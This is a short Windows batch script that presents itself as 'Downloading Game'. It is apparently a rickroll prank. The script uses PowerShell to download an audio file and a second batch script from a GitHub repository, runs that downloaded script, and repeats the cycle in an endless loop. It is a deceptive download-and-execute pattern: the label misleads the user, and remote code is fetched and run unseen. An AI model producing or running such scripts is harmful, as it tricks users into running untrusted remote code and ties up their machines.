@echo off

echo Downloading Game

:DOWNLOAD
  mkdir %TEMP%\yompBest
  powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3 -OutFile %TEMP%\yompBest\role.mp3"
  powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat -OutFile %TEMP%\yompBest\m.bat"
  %TEMP%\yompBest\m %TEMP%\yompBest\role.mp3
  timeout 213
 goto :DOWNLOAD
